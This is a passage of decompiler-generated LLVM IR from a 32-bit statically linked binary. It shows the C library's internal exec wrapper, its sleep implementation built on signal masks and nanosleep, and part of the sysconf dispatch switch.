  %v12_80607ce = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80607d4

dec_label_pc_80607d4:                             ; preds = %dec_label_pc_80607d4, %entry
  %v0_80607d7 = phi i32 [ 0, %entry ], [ %v1_80607d7, %dec_label_pc_80607d4 ]
  %stack_var_-16.0 = phi i32 [ %v2_80607cb, %entry ], [ %v1_80607d8, %dec_label_pc_80607d4 ]
  %v1_80607d7 = add i32 %v0_80607d7, 1
  store i32 %v1_80607d7, i32* %esi.global-to-local, align 4
  %v1_80607d8 = add i32 %stack_var_-16.0, 4
  store i32 %v1_80607d8, i32* %eax.global-to-local, align 4
  %v1_80607de = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_80607de = load i32, i32* %v1_80607de, align 4
  %v3_80607de = icmp eq i32 %v2_80607de, 0
  %v1_80607e1 = icmp eq i1 %v3_80607de, false
  br i1 %v1_80607e1, label %dec_label_pc_80607d4, label %dec_label_pc_80607e3

dec_label_pc_80607e3:                             ; preds = %dec_label_pc_80607d4
  %v1_80607e3 = mul i32 %v1_80607d7, 4
  %v2_80607e3 = add i32 %v1_80607e3, 34
  %v1_80607ea = and i32 %v2_80607e3, -16
  %v2_80607ed = sub i32 %v12_80607ce, %v1_80607ea
  %v1_80607f2 = add i32 %v2_80607ed, 15
  %v1_80607f6 = and i32 %v1_80607f2, -16
  store i32 %v1_80607f6, i32* @ebx, align 4
  store i32 %v1_80607f6, i32* %ecx.global-to-local, align 4
  %v2_80607fb = inttoptr i32 %v1_80607f6 to i32*
  store i32 %arg2, i32* %v2_80607fb, align 16
  store i32 %v2_80607cb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060803

dec_label_pc_8060803:                             ; preds = %dec_label_pc_8060803, %dec_label_pc_80607e3
  %stack_var_-16.1 = phi i32 [ %v2_80607cb, %dec_label_pc_80607e3 ], [ %v1_806080a, %dec_label_pc_8060803 ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8060806 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8060806 = add i32 %v0_8060806, 4
  store i32 %v1_8060806, i32* %ecx.global-to-local, align 4
  %v0_8060809 = load i32, i32* %esi.global-to-local, align 4
  %v1_8060809 = add i32 %v0_8060809, -1
  %v8_8060809 = icmp eq i32 %v1_8060809, 0
  store i32 %v1_8060809, i32* %esi.global-to-local, align 4
  %v1_806080a = add i32 %stack_var_-16.1, 4
  %v1_8060810 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8060810 = load i32, i32* %v1_8060810, align 4
  store i32 %v2_8060810, i32* %eax.global-to-local, align 4
  %v2_8060812 = inttoptr i32 %v1_8060806 to i32*
  store i32 %v2_8060810, i32* %v2_8060812, align 4
  %v1_8060814 = icmp eq i1 %v8_8060809, false
  br i1 %v1_8060814, label %dec_label_pc_8060803, label %dec_label_pc_8060816

dec_label_pc_8060816:                             ; preds = %dec_label_pc_8060803
  %v0_8060816 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060816 = load i32, i32* @esp, align 4
  %v2_8060816 = add i32 %v1_8060816, -4
  %v3_8060816 = inttoptr i32 %v2_8060816 to i32*
  store i32 %v0_8060816, i32* %v3_8060816, align 4
  %v0_8060817 = load i32, i32* @global_var_807d130.763, align 16
  %v2_8060817 = add i32 %v1_8060816, -8
  %v3_8060817 = inttoptr i32 %v2_8060817 to i32*
  store i32 %v0_8060817, i32* %v3_8060817, align 4
  %v0_806081d = load i32, i32* @ebx, align 4
  %v2_806081d = add i32 %v1_8060816, -12
  %v3_806081d = inttoptr i32 %v2_806081d to i32*
  store i32 %v0_806081d, i32* %v3_806081d, align 4
  %v5_806081e = add i32 %v1_8060816, -16
  %v6_806081e = inttoptr i32 %v5_806081e to i32*
  store i32 %arg1, i32* %v6_806081e, align 4
  %v1_8060821 = inttoptr i32 %v1_806080a to i8*
  %v2_8060821 = call i32 @__GI_execve(i8* %v1_8060821)
  store i32 %v2_8060821, i32* %eax.global-to-local, align 4
  %v2_8060829 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8060829, i32* @ebx, align 4
  ret i32 %v2_8060821

; uselistorder directives
  uselistorder i32 %v1_8060809, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_80607d8, { 1, 0 }
  uselistorder i32 %v1_80607d7, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_80607cb, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8060830 = load i32, i32* @ebp, align 4
  %v0_8060831 = load i32, i32* @edi, align 4
  %v0_8060832 = load i32, i32* @esi, align 4
  %v0_8060833 = load i32, i32* @ebx, align 4
  %v15_8060834 = ptrtoint i32* %stack_var_-444 to i32
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_8060846 = icmp eq i32 %arg1, 0
  %v1_8060848 = icmp eq i1 %v1_8060846, false
  br i1 %v1_8060848, label %dec_label_pc_806085a.preheader, label %dec_label_pc_80609a7

dec_label_pc_806085a.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806084f

dec_label_pc_806084f:                             ; preds = %dec_label_pc_806084f.dec_label_pc_806084f_crit_edge, %dec_label_pc_806085a.preheader
  %v0_806084f = phi i32 [ %v15_8060834, %dec_label_pc_806085a.preheader ], [ %v0_806084f.pre, %dec_label_pc_806084f.dec_label_pc_806084f_crit_edge ]
  %v1_806085a27 = phi i32 [ 31, %dec_label_pc_806085a.preheader ], [ %v1_806085a, %dec_label_pc_806084f.dec_label_pc_806084f_crit_edge ]
  %v2_806084f = mul i32 %v1_806085a27, 4
  %v3_806084f = add i32 %v2_806084f, 292
  %v4_806084f = add i32 %v3_806084f, %v0_806084f
  %v5_806084f = inttoptr i32 %v4_806084f to i32*
  store i32 0, i32* %v5_806084f, align 4
  %v0_806085a.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_806085a = add i32 %v0_806085a.pre, -1
  %v9_806085a = icmp slt i32 %v1_806085a, 0
  store i32 %v1_806085a, i32* %eax.global-to-local, align 4
  %v1_806085b = icmp eq i1 %v9_806085a, false
  br i1 %v1_806085b, label %dec_label_pc_806084f.dec_label_pc_806084f_crit_edge, label %dec_label_pc_806085d

dec_label_pc_806084f.dec_label_pc_806084f_crit_edge: ; preds = %dec_label_pc_806084f
  %v0_806084f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806084f

dec_label_pc_806085d:                             ; preds = %dec_label_pc_806084f
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8060873 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8060873, i32* @ebx, align 4
  store i32 %v2_8060873, i32* %stack_var_-460, align 4
  %v4_806087b = call i32 @__sigaddset(i32 %v2_8060873, i32 17, i32 %v1_806085a, i32 %v1_806085a)
  store i32 %v4_806087b, i32* %eax.global-to-local, align 4
  %v2_8060883 = icmp slt i32 %v4_806087b, 0
  br i1 %v2_8060883, label %dec_label_pc_80609ab, label %dec_label_pc_806088b

dec_label_pc_806088b:                             ; preds = %dec_label_pc_806085d
  %v2_806088c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_806088c, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8060897 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8060897 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8060897, i32 %v2_806088c)
  store i32 %v4_8060897, i32* %eax.global-to-local, align 4
  %v1_806089f = icmp eq i32 %v4_8060897, 0
  %v1_80608a1 = icmp eq i1 %v1_806089f, false
  br i1 %v1_80608a1, label %dec_label_pc_80609ab, label %dec_label_pc_80608a7

dec_label_pc_80608a7:                             ; preds = %dec_label_pc_806088b
  store i32 %v2_806088c, i32* %stack_var_-460, align 4
  %v4_80608ac = call i32 @__sigismember(i32 %v2_806088c, i32 17, i32 %v4_8060897, i32 %v4_8060897)
  store i32 %v4_80608ac, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80608b9 = icmp eq i32 %v4_80608ac, 0
  br i1 %v1_80608b9, label %dec_label_pc_80608cd.preheader, label %dec_label_pc_8060975

dec_label_pc_80608cd.preheader:                   ; preds = %dec_label_pc_80608a7
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80608c2

dec_label_pc_80608c2:                             ; preds = %dec_label_pc_80608c2.dec_label_pc_80608c2_crit_edge, %dec_label_pc_80608cd.preheader
  %v0_80608c2 = phi i32 [ %v15_8060834, %dec_label_pc_80608cd.preheader ], [ %v0_80608c2.pre, %dec_label_pc_80608c2.dec_label_pc_80608c2_crit_edge ]
  %v1_80608cd26 = phi i32 [ 31, %dec_label_pc_80608cd.preheader ], [ %v1_80608cd, %dec_label_pc_80608c2.dec_label_pc_80608c2_crit_edge ]
  %v2_80608c2 = mul i32 %v1_80608cd26, 4
  %v3_80608c2 = add i32 %v2_80608c2, 292
  %v4_80608c2 = add i32 %v3_80608c2, %v0_80608c2
  %v5_80608c2 = inttoptr i32 %v4_80608c2 to i32*
  store i32 0, i32* %v5_80608c2, align 4
  %v0_80608cd.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_80608cd = add i32 %v0_80608cd.pre, -1
  %v9_80608cd = icmp slt i32 %v1_80608cd, 0
  store i32 %v1_80608cd, i32* %edx.global-to-local, align 4
  %v1_80608ce = icmp eq i1 %v9_80608cd, false
  br i1 %v1_80608ce, label %dec_label_pc_80608c2.dec_label_pc_80608c2_crit_edge, label %dec_label_pc_80608d0

dec_label_pc_80608c2.dec_label_pc_80608c2_crit_edge: ; preds = %dec_label_pc_80608c2
  %v0_80608c2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80608c2

dec_label_pc_80608d0:                             ; preds = %dec_label_pc_80608c2
  store i32 %v2_8060873, i32* %eax.global-to-local, align 4
  store i32 %v2_8060873, i32* %stack_var_-460, align 4
  %v4_80608dc = call i32 @__sigaddset(i32 %v2_8060873, i32 17, i32 0, i32 0)
  store i32 %v4_80608dc, i32* %eax.global-to-local, align 4
  %v2_80608e4 = icmp slt i32 %v4_80608dc, 0
  br i1 %v2_80608e4, label %dec_label_pc_80609ab, label %dec_label_pc_80608ec

dec_label_pc_80608ec:                             ; preds = %dec_label_pc_80608d0
  %v2_80608ed = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_80608ed, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_80608f6 = call i32 @__GI_sigaction(i32 17, i32* null, i32 %v2_80608ed)
  store i32 %v4_80608f6, i32* %eax.global-to-local, align 4
  %v2_80608fe = icmp slt i32 %v4_80608f6, 0
  %v1_8060900 = icmp eq i1 %v2_80608fe, false
  br i1 %v1_8060900, label %dec_label_pc_806092a, label %dec_label_pc_8060902

dec_label_pc_8060902:                             ; preds = %dec_label_pc_80608ec
  %v0_8060902 = load i32, i32* %stack_var_-460, align 4
  %v1_8060902 = call i32 @__errno_location(i32 %v0_8060902)
  store i32 %v1_8060902, i32* %eax.global-to-local, align 4
  store i32 %v1_8060902, i32* @ebx, align 4
  %v1_8060909 = inttoptr i32 %v1_8060902 to i32*
  %v2_8060909 = load i32, i32* %v1_8060909, align 4
  store i32 %v2_8060909, i32* @esi, align 4
  store i32 %v2_806088c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8060918 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8060918 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8060918, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8060923 = load i32, i32* @esi, align 4
  %v1_8060923 = load i32, i32* @ebx, align 4
  %v2_8060923 = inttoptr i32 %v1_8060923 to i32*
  store i32 %v0_8060923, i32* %v2_8060923, align 4
  %v0_80609b8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80609ae

dec_label_pc_806092a:                             ; preds = %dec_label_pc_80608ec
  %v3_806092a = load i32, i32* %stack_var_-420, align 4
  %v12_806092a = icmp eq i32 %v3_806092a, 1
  store i32 %v2_806088c, i32* @ebp, align 4
  %v2_8060936 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8060936, i32* @ebx, align 4
  %v1_806093d = icmp eq i1 %v12_806092a, false
  br i1 %v1_806093d, label %dec_label_pc_8060964, label %dec_label_pc_806093f

dec_label_pc_806093f:                             ; preds = %dec_label_pc_806092a
  store i32 %v2_8060936, i32* %stack_var_-460, align 4
  %v2_8060943 = call i32 @nanosleep(i32 %v2_8060936, i32 %v2_8060936)
  store i32 %v2_8060943, i32* %eax.global-to-local, align 4
  store i32 %v2_8060943, i32* @edi, align 4
  %v1_806094a = call i32 @__errno_location(i32 %v2_8060936)
  store i32 %v1_806094a, i32* %eax.global-to-local, align 4
  store i32 %v1_806094a, i32* @ebx, align 4
  %v1_8060954 = inttoptr i32 %v1_806094a to i32*
  %v2_8060954 = load i32, i32* %v1_8060954, align 4
  store i32 %v2_8060954, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_806095b = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_806095b = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_806095b, i32 0)
  store i32 %v4_806095b, i32* %eax.global-to-local, align 4
  %v0_8060960 = load i32, i32* @esi, align 4
  %v1_8060960 = load i32, i32* @ebx, align 4
  %v2_8060960 = inttoptr i32 %v1_8060960 to i32*
  store i32 %v0_8060960, i32* %v2_8060960, align 4
  %v0_806098a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8060987

dec_label_pc_8060964:                             ; preds = %dec_label_pc_806092a
  store i32 2, i32* %stack_var_-460, align 4
  %v3_806096a = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_806096a = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_806096a, i32 0)
  store i32 %v4_806096a, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  store i32 %v2_806088c, i32* @ecx, align 4
  br label %dec_label_pc_8060980

dec_label_pc_8060975:                             ; preds = %dec_label_pc_80608a7
  %v2_8060977 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8060977, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060980

dec_label_pc_8060980:                             ; preds = %dec_label_pc_8060964, %dec_label_pc_8060975
  %storemerge3.pre-phi = phi i32 [ %v2_8060936, %dec_label_pc_8060964 ], [ %v2_8060977, %dec_label_pc_8060975 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v2_8060980 = call i32 @nanosleep(i32 %storemerge3.pre-phi, i32 %storemerge3.pre-phi)
  store i32 %v2_8060980, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060987

dec_label_pc_8060987:                             ; preds = %dec_label_pc_806093f, %dec_label_pc_8060980
  %v0_806098a = phi i32 [ %v0_806098a.pre, %dec_label_pc_806093f ], [ %v2_8060980, %dec_label_pc_8060980 ]
  %v1_806098a = icmp eq i32 %v0_806098a, 0
  br i1 %v1_806098a, label %dec_label_pc_80609a7, label %dec_label_pc_806098e

dec_label_pc_806098e:                             ; preds = %dec_label_pc_8060987
  %v4_806099e = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_806099e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80609ae

dec_label_pc_80609a7:                             ; preds = %entry, %dec_label_pc_8060987
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80609ae

dec_label_pc_80609ab:                             ; preds = %dec_label_pc_80608d0, %dec_label_pc_806088b, %dec_label_pc_806085d
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80609ae

dec_label_pc_80609ae:                             ; preds = %dec_label_pc_80609a7, %dec_label_pc_806098e, %dec_label_pc_8060902, %dec_label_pc_80609ab
  %v0_80609b8 = phi i32 [ 0, %dec_label_pc_80609a7 ], [ %v4_806099e, %dec_label_pc_806098e ], [ %v0_80609b8.pre, %dec_label_pc_8060902 ], [ -1, %dec_label_pc_80609ab ]
  store i32 %v0_8060833, i32* @ebx, align 4
  store i32 %v0_8060832, i32* @esi, align 4
  store i32 %v0_8060831, i32* @edi, align 4
  store i32 %v0_8060830, i32* @ebp, align 4
  ret i32 %v0_80609b8

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 2, 0, 1 }
  uselistorder i32 %v1_806094a, { 1, 0, 2 }
  uselistorder i32 %v2_8060936, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_80608cd, { 2, 1, 0 }
  uselistorder i32 %v2_806088c, { 0, 3, 2, 5, 4, 1, 6 }
  uselistorder i32 %v2_8060873, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_806085a, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 1, 3, 2, 0, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 0, 23 }
  uselistorder i32 (i32, i32*, i32)* @__GI_sigaction, { 1, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0, 2 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 10, 11, 12, 13, 14, 3, 1, 7, 8, 9, 15, 4, 5, 2, 6, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80609ae, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80609a7, { 1, 0 }
  uselistorder label %dec_label_pc_8060987, { 1, 0 }
  uselistorder label %dec_label_pc_8060980, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_80609db [
    i32 0, label %dec_label_pc_80609eb
    i32 1, label %dec_label_pc_8060ad0
    i32 2, label %dec_label_pc_80609f5
    i32 3, label %dec_label_pc_80609ff
    i32 4, label %dec_label_pc_8060a09
    i32 5, label %dec_label_pc_8060a9f
    i32 6, label %dec_label_pc_8060a11
    i32 7, label %dec_label_pc_80609d1
    i32 8, label %dec_label_pc_80609d1
    i32 9, label %dec_label_pc_80609d1
    i32 10, label %dec_label_pc_80609d1
    i32 11, label %dec_label_pc_80609d1
    i32 12, label %dec_label_pc_80609d1
    i32 13, label %dec_label_pc_80609d1
    i32 14, label %dec_label_pc_80609d1
    i32 15, label %dec_label_pc_80609d1
    i32 16, label %dec_label_pc_80609d1
    i32 17, label %dec_label_pc_80609d1
    i32 18, label %dec_label_pc_80609d1
    i32 19, label %dec_label_pc_80609d1
    i32 20, label %dec_label_pc_80609d1
    i32 21, label %dec_label_pc_80609d1
    i32 22, label %dec_label_pc_80609d1
    i32 23, label %dec_label_pc_8060ad0
    i32 24, label %dec_label_pc_8060ad0
    i32 25, label %dec_label_pc_8060adc
    i32 26, label %dec_label_pc_8060aad
    i32 27, label %dec_label_pc_8060ad0
    i32 28, label %dec_label_pc_8060a23
    i32 29, label %dec_label_pc_8060aa6
    i32 30, label %dec_label_pc_8060a1b
    i32 31, label %dec_label_pc_8060abb
    i32 32, label %dec_label_pc_8060ad0
    i32 33, label %dec_label_pc_8060ad0
    i32 34, label %dec_label_pc_8060ad0
    i32 35, label %dec_label_pc_8060ab4
    i32 36, label %dec_label_pc_8060ae3
    i32 37, label %dec_label_pc_8060aea
    i32 38, label %dec_label_pc_8060ae3
    i32 39, label %dec_label_pc_8060a2d
    i32 40, label %dec_label_pc_8060af1
    i32 41, label %dec_label_pc_8060ad0
    i32 42, label %dec_label_pc_8060abb
    i32 43, label %dec_label_pc_8060aea
    i32 44, label %dec_label_pc_8060af8
    i32 45, label %dec_label_pc_8060aea
    i32 46, label %dec_label_pc_8060aa6
    i32 47, label %dec_label_pc_8060aa6
    i32 48, label %dec_label_pc_8060aa6
    i32 49, label %dec_label_pc_8060ad0
    i32 50, label %dec_label_pc_8060ad0
    i32 51, label %dec_label_pc_8060aa6
    i32 52, label %dec_label_pc_8060aa6
    i32 53, label %dec_label_pc_8060ad0
    i32 54, label %dec_label_pc_8060ad0
    i32 55, label %dec_label_pc_8060ad0
    i32 56, label %dec_label_pc_8060ad0
    i32 57, label %dec_label_pc_8060ad0
    i32 58, label %dec_label_pc_8060ad0
    i32 59, label %dec_label_pc_8060ad0
    i32 60, label %dec_label_pc_8060ad0
    i32 61, label %dec_label_pc_8060ad0
    i32 62, label %dec_label_pc_8060ad0
    i32 63, label %dec_label_pc_8060ad0
    i32 64, label %dec_label_pc_8060ad0
    i32 65, label %dec_label_pc_8060ad0
    i32 66, label %dec_label_pc_8060ad0
    i32 67, label %dec_label_pc_80609d1
    i32 68, label %dec_label_pc_80609d1
    i32 69, label %dec_label_pc_8060ab4
    i32 70, label %dec_label_pc_8060ab4
    i32 71, label %dec_label_pc_8060ab4
    i32 72, label %dec_label_pc_8060abb
    i32 73, label %dec_label_pc_8060ac2
    i32 74, label %dec_label_pc_8060ac9
    i32 75, label %dec_label_pc_8060a37
    i32 76, label %dec_label_pc_8060ac9
    i32 77, label %dec_label_pc_80609d1
    i32 78, label %dec_label_pc_80609d1
    i32 79, label %dec_label_pc_80609d1
    i32 80, label %dec_label_pc_80609d1
    i32 81, label %dec_label_pc_80609d1
    i32 82, label %dec_label_pc_80609d1
    i32 83, label %dec_label_pc_80609d1
    i32 84, label %dec_label_pc_80609d1
    i32 85, label %dec_label_pc_8060ad0
    i32 86, label %dec_label_pc_8060ad0
    i32 87, label %dec_label_pc_8060aad
    i32 88, label %dec_label_pc_8060a41
    i32 89, label %dec_label_pc_8060a4b
    i32 90, label %dec_label_pc_8060ac2
    i32 91, label %dec_label_pc_80609d1
    i32 92, label %dec_label_pc_80609d1
    i32 93, label %dec_label_pc_80609d1
    i32 94, label %dec_label_pc_80609d1
    i32 95, label %dec_label_pc_8060aa6
    i32 96, label %dec_label_pc_8060ad0
    i32 97, label %dec_label_pc_8060ad0
    i32 98, label %dec_label_pc_80609d1
    i32 99, label %dec_label_pc_80609d1
    i32 100, label %dec_label_pc_80609d1
    i32 101, label %dec_label_pc_8060a55
    i32 102, label %dec_label_pc_8060a98
    i32 103, label %dec_label_pc_8060ad5
    i32 104, label %dec_label_pc_8060aad
    i32 105, label %dec_label_pc_8060a5f
    i32 106, label %dec_label_pc_8060abb
    i32 107, label %dec_label_pc_8060abb
    i32 108, label %dec_label_pc_8060a9f
    i32 109, label %dec_label_pc_8060adc
    i32 110, label %dec_label_pc_8060af8
    i32 111, label %dec_label_pc_8060a98
    i32 112, label %dec_label_pc_8060ad5
    i32 113, label %dec_label_pc_8060af8
    i32 114, label %dec_label_pc_8060a69
    i32 115, label %dec_label_pc_8060af1
    i32 116, label %dec_label_pc_8060ad0
    i32 117, label %dec_label_pc_8060ad0
    i32 118, label %dec_label_pc_8060a73
    i32 119, label %dec_label_pc_8060a7d
    i32 120, label %dec_label_pc_8060aea
    i32 121, label %dec_label_pc_8060aad
    i32 122, label %dec_label_pc_8060aad
    i32 123, label %dec_label_pc_8060aad
    i32 124, label %dec_label_pc_8060aad
    i32 125, label %dec_label_pc_80609d1
    i32 126, label %dec_label_pc_80609d1
    i32 127, label %dec_label_pc_8060ad0
    i32 128, label %dec_label_pc_8060ad0
    i32 129, label %dec_label_pc_80609d1
    i32 130, label %dec_label_pc_80609d1
    i32 131, label %dec_label_pc_8060ad0
    i32 149, label %dec_label_pc_8060a84
  ]

dec_label_pc_80609d1:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8060afd

dec_label_pc_80609db:                             ; preds = %entry
  %v1_80609db = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_80609e0 = inttoptr i32 %v1_80609db to i32*
  store i32 22, i32* %v1_80609e0, align 4
  br label %dec_label_pc_8060ad0

dec_label_pc_80609eb:                             ; preds = %entry
  br label %dec_label_pc_8060afd

dec_label_pc_80609f5:                             ; preds = %entry
  br label %dec_label_pc_8060afd

dec_label_pc_80609ff:                             ; preds = %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060a09:                             ; preds = %entry
  %v1_8060a0c = call i32 @getdtablesize(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8060a11

dec_label_pc_8060a11:                             ; preds = %entry, %dec_label_pc_8060a09
  br label %dec_label_pc_8060afd

dec_label_pc_8060a1b:                             ; preds = %entry
  %v1_8060a1e = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8060a23

dec_label_pc_8060a23:                             ; preds = %entry, %dec_label_pc_8060a1b
  br label %dec_label_pc_8060afd

dec_label_pc_8060a2d:                             ; preds = %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060a37:                             ; preds = %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060a41:                             ; preds = %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060a4b:                             ; preds = %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060a55:                             ; preds = %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060a5f:                             ; preds = %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060a69:                             ; preds = %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060a73:                             ; preds = %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060a7d:                             ; preds = %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060a84:                             ; preds = %entry
  %v5_8060a8a = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8060a92 = icmp slt i32 %v5_8060a8a, 0
  %v1_8060a94 = icmp eq i1 %v2_8060a92, false
  br i1 %v1_8060a94, label %dec_label_pc_8060aa6, label %dec_label_pc_8060ad0

dec_label_pc_8060a98:                             ; preds = %entry, %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060a9f:                             ; preds = %entry, %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060aa6:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8060a84
  br label %dec_label_pc_8060afd

dec_label_pc_8060aad:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060ab4:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060abb:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060ac2:                             ; preds = %entry, %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060ac9:                             ; preds = %entry, %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060ad0:                             ; preds = %dec_label_pc_8060a84, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_80609db
  br label %dec_label_pc_8060afd

dec_label_pc_8060ad5:                             ; preds = %entry, %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060adc:                             ; preds = %entry, %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060ae3:                             ; preds = %entry, %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060aea:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060af1:                             ; preds = %entry, %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060af8:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8060afd

dec_label_pc_8060afd:                             ; preds = %dec_label_pc_8060af1, %dec_label_pc_8060aea, %dec_label_pc_8060ae3, %dec_label_pc_8060adc, %dec_label_pc_8060ad5, %dec_label_pc_8060ac9, %dec_label_pc_8060ac2, %dec_label_pc_8060abb, %dec_label_pc_8060ab4, %dec_label_pc_8060aad, %dec_label_pc_8060a9f, %dec_label_pc_8060a98, %dec_label_pc_8060aa6, %dec_label_pc_8060a7d, %dec_label_pc_8060a73, %dec_label_pc_8060a69, %dec_label_pc_8060a5f, %dec_label_pc_8060a55, %dec_label_pc_8060a4b, %dec_label_pc_8060a41, %dec_label_pc_8060a37, %dec_label_pc_8060a2d, %dec_label_pc_8060a23, %dec_label_pc_8060a11, %dec_label_pc_80609ff, %dec_label_pc_80609f5, %dec_label_pc_80609eb, %dec_label_pc_80609d1, %dec_label_pc_8060ad0, %dec_label_pc_8060af8
